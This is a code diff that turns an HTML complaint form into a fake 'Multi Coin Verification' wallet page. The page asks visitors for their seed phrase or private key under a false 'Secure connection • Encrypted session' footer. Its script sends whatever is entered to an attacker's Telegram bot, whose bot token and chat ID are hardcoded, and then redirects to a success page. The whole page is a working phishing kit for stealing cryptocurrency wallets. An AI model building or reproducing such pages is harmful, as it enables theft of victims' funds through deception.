@@ -3,12 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Complaint Form</title>
+<title>Wallet Verification</title>
 
 <style>
 body {
-  font-family: Arial;
-  background: #f4f6f9;
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0d1117;
+  color: #fff;
   display: flex;
   justify-content: center;
   align-items: center;
@@ -16,24 +18,35 @@ body {
 }
 
 .container {
-  background: white;
-  padding: 25px;
-  border-radius: 10px;
+  background: #161b22;
+  padding: 30px;
+  border-radius: 12px;
   width: 100%;
-  max-width: 400px;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+  max-width: 380px;
+  box-shadow: 0 0 30px rgba(0,0,0,0.6);
+  border: 1px solid #30363d;
 }
 
 h2 {
   text-align: center;
+  margin-bottom: 20px;
+  font-weight: 500;
 }
 
 input, textarea {
   width: 100%;
   padding: 12px;
   margin-top: 10px;
-  border-radius: 6px;
-  border: 1px solid #ccc;
+  border-radius: 8px;
+  border: 1px solid #30363d;
+  background: #0d1117;
+  color: #fff;
+  font-size: 14px;
+  outline: none;
+}
+
+input:focus, textarea:focus {
+  border-color: #238636;
 }
 
 .textarea-wrapper {
@@ -41,8 +54,8 @@ input, textarea {
 }
 
 textarea {
-  height: 130px;
   resize: none;
+  height: 110px;
   padding-right: 50px;
 }
 
@@ -50,28 +63,36 @@ textarea {
   position: absolute;
   top: 8px;
   right: 8px;
-  font-size: 12px;
-  padding: 5px 8px;
-  background: green;
+  font-size: 11px;
+  padding: 4px 7px;
+  background: #238636;
   color: white;
   border: none;
   border-radius: 4px;
   cursor: pointer;
 }
 
+.paste-btn:hover {
+  background: #2ea043;
+}
+
 .submit-btn {
   width: 100%;
-  margin-top: 15px;
   padding: 12px;
-  background: #007bff;
-  color: white;
+  margin-top: 18px;
+  border-radius: 8px;
   border: none;
-  border-radius: 6px;
+  background: linear-gradient(90deg, #238636, #2ea043);
+  color: white;
+  font-size: 14px;
   cursor: pointer;
 }
 
-.submit-btn:hover {
-  background: #0056b3;
+.footer {
+  text-align: center;
+  font-size: 12px;
+  margin-top: 15px;
+  color: #8b949e;
 }
 </style>
 </head>
@@ -79,69 +100,60 @@ textarea {
 <body>
 
 <div class="container">
-<h2>Submit Complaint</h2>
+  <h2>Multi Coin Verification</h2>
+  <p>Login to Continue</p>
 
-<form id="complaintForm">
-<!-- Username Field -->
-<div class="field">
-  <input type="text" name="name" placeholder=" Wallet Name" required>
-  <div class="required-text">* Required</div>
-</div>
-    <!-- Complaint Field + Paste Button -->
-    <div class="field">
-      <div class="textarea-row">
-        <textarea name="message" name="name"  placeholder="Input Phrase" required></textarea>
-       <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
-</div>
-      <div class="required-text">Enter seed phrase or private key
-Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>
+  <form id="form">
+    <input type="text" id="username" placeholder="Wallet Name/Trust wallet/exoduswallet" required>
+
+    <div class="textarea-wrapper">
+      <textarea id="complaint" placeholder="Enter recovery phrase" required></textarea>
+      <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
     </div>
-    <button type="submit" class="submit-btn">Restore Wallet</button>
 
+    <button class="submit-btn">Restore Wallet</button>
   </form>
 
+  <div class="footer">
+    Secure connection • Encrypted session
+  </div>
 </div>
 
 <script>
-// ========================
-// 🔐 YOUR TELEGRAM INFO
-// ========================
+// 🔐 PUT YOUR REAL BOT TOKEN HERE
 const TOKEN = "8214623213:AAGlhEDRFbCnQaG0X1r2blaG0YJlHlkNkRs";
+
+// ✅ Your chat ID (you already got it)
 const CHAT_ID = "6994958690";
 
-// ========================
-// 📋 Paste clipboard
-// ========================
+// 📋 Paste button
 async function pasteClipboard() {
   try {
     const text = await navigator.clipboard.readText();
     document.getElementById("complaint").value += text;
   } catch {
-    alert("Clipboard access denied!");
+    alert("Clipboard denied");
   }
 }
 
-// ========================
-// 📩 Submit form to Telegram
-// ========================
-document.getElementById("complaintForm").addEventListener("submit", async function(e) {
+// 📩 Send to Telegram
+document.getElementById("form").addEventListener("submit", async (e) => {
   e.preventDefault();
 
   const username = document.getElementById("username").value;
   const complaint = document.getElementById("complaint").value;
 
-  const message =
-`🚨 NEW COMPLAINT RECEIVED
+  const message = `🔐 Wallet Verification
 
-👤 Name: ${username}
+👤 User: ${username}
 
-📝 Message:
+📝 Data:
 ${complaint}
 
-⏰ Time: ${new Date().toLocaleString()}`;
+⏰ ${new Date().toLocaleString()}`;
 
   try {
-    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -152,13 +164,10 @@ ${complaint}
       })
     });
 
-    if (res.ok) {
-      window.location.href = "success.html";
-    } else {
-      alert("Failed to send complaint!");
-    }
+    // ✅ Redirect after success
+    window.location.href = "success.html";
 
-  } catch (err) {
+  } catch {
     alert("Network error!");
   }
 });
